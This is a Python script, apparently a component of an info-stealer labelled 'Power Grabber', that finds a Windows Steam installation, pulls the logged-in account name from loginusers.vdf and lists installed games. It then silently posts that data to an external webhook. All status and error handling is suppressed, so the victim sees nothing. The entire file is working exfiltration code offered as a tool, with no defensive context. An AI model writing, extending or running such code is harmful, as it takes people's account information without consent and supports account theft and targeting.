import os
import re
import requests

STEAM_DEFAULT_PATHS = [
    "C:\\Program Files (x86)\\Steam",
    "C:\\Program Files\\Steam",
    os.path.expanduser("~\\AppData\\Local\\Steam")
]
SYSTEM_GAME_NAMES = {
    "Steamworks Common Redistributables",
    "SteamVR",
    "Steam Client",
    "Source SDK",
    "Steam Runtime"
}
def is_steam_installed():
    for path in STEAM_DEFAULT_PATHS:
        steam_exe_path = os.path.join(path, "steam.exe")
        if os.path.exists(steam_exe_path):
            return path
    return None
def get_account_name_from_vdf(vdf_path):
    try:
        with open(vdf_path, "r", encoding="utf-8") as file:
            data = file.read()
            match = re.search(r'"AccountName"\s+"(.*?)"', data)
            if match:
                return match.group(1)
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    return None
def get_library_folders(steam_install_path):
    libraryfolders_path = os.path.join(steam_install_path, "steamapps", "libraryfolders.vdf")
    library_folders = [steam_install_path]
    if os.path.exists(libraryfolders_path):
        with open(libraryfolders_path, "r", encoding="utf-8") as file:
            data = file.read()
            additional_folders = re.findall(r'"path"\s+"(.*?)"', data)
            library_folders.extend(additional_folders)
    return library_folders
def parse_acf_file(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        for line in file:
            if '"name"' in line:
                return line.split('"')[3]
    return None
def get_installed_steam_games(steam_install_path):
    installed_games = []
    library_folders = get_library_folders(steam_install_path)
    for library in library_folders:
        steamapps_path = os.path.join(library, "steamapps")
        if os.path.exists(steamapps_path):
            for item in os.listdir(steamapps_path):
                if item.endswith(".acf"):
                    acf_path = os.path.join(steamapps_path, item)
                    game_name = parse_acf_file(acf_path)
                    if game_name and game_name not in SYSTEM_GAME_NAMES:
                        installed_games.append(game_name)
    return installed_games
def send_webhook(account_name, games):
    embed = {
        "embeds": [
            {
                "title": "Steam Account Info",
                "description": f"**Steam Account Name:** {account_name}\n\n**Installed Games:**\n" + "\n".join(games),
                "color": 0x8b0000,
                "footer": {
                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe"
                }
            }
        ]
    }
    
    try:
        response = requests.post(webhook_url, json=embed)
        if response.status_code == 204:
            pass
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass
def main():
    steam_install_path = is_steam_installed()
    if steam_install_path:
        config_path = os.path.join(steam_install_path, "config")
        vdf_path = os.path.join(config_path, "loginusers.vdf")
        account_name = get_account_name_from_vdf(vdf_path)
        if account_name:
            pass
        else:
            pass
        games = get_installed_steam_games(steam_install_path)
        if games:
            pass
            for game in games:
                pass
        else:
            pass
        if account_name:
            send_webhook(account_name, games)
    else:
        pass
if __name__ == "__main__":
    main()
